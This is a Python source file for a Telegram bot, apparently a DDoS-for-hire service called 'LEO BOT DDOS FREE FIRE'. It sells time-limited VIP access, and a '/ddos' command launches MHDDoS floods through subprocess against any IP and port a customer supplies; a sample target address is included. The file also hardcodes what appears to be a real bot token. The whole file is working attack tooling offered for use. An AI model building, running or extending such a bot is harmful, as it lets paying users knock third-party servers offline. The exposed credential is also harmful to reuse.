import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7740554704:AAHrbTeyeiHqodsd2tZKc-E6g-hHkak8_tQ"
ADMIN_ID = 6772734775
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ *SEU PLANO VIP EXPIROU.*"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"✅ CLIENTE VIP!\n"
                f"⏳ DIAS RESTANTES: {dias_restantes} DIAS\n"
                f"📅 EXPIRA EM: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "❌ *VC NÃO TEM PLANO VIP ATIVO.*"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="💻 VENDEDOR - OFICIAL 💻",
        url=f"tg://user?id={ADMIN_ID}"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "*LEO BOT DDOS FREE FIRE!*"
            

            f"""
```
{vip_status}```\n"""
            "📌 *COMO USAR:*"
            """
```
/ddos <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
            "💡 *EXEMPLO:*"
            """
```
/ddos UDP 143.92.125.230:10013 10 900```\n"""
            "VC É UM USUÁRIO VIP "
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["addvip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ VOCÊ NÃO É UM VENDEDOR AUTORIZADO.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ FORMATO INVÁLIDO. USE: `/addvip <ID> <QUANTOS DIAS>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"✅ USUÁRIO {telegram_id} ADICIONADO COMO VIP POR {days} DIAS.")


@bot.message_handler(commands=["ddos"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ VOCÊ NÃO TEM PERMISSÃO PARA USAR ESTE COMANDO.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "❌ SEU ACCESO VIP EXPIROU")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 3:
        bot.reply_to(message, "❌ ESPERE 3 SEGUNDOS ANTES DE COMEÇAR OUTRO ATACK E LEMBRE-SE DE PARAR O ANTERIOR")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *FORMATO INVÁLIDO!*\n\n"
                "📌 *USO CORRETO:*\n"
                "`/ddos <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                "💡 *EXEMPLO:*\n"
                "`/ddos UDP 143.92.125.230:10013 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ PARAR ATACK", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[✅] ATACK INICIADO - 200 [✅]*\n\n"
            f"🌐 *PORTO:* {ip_port}\n"
            f"⚙️ *TIPO:* {attack_type}\n"
            f"🧟‍♀️ *DELAY:* {threads}\n"
            f"⏳ *TEMPO* {duration}\n\n"
            f"💠 VC É UM USUÁRIO VIP 💠"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ SOMENTE O USUÁRIO QUE O INICIOU ATACK PODE PARARLO"
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ ATACK PARADO COM SUCESSO.")
        bot.edit_message_text(
            "*[⛔] ATACK FINALIZADO[⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "NENHUM ATACK ENCONTRADO")

if __name__ == "__main__":
    bot.infinity_polling()
        
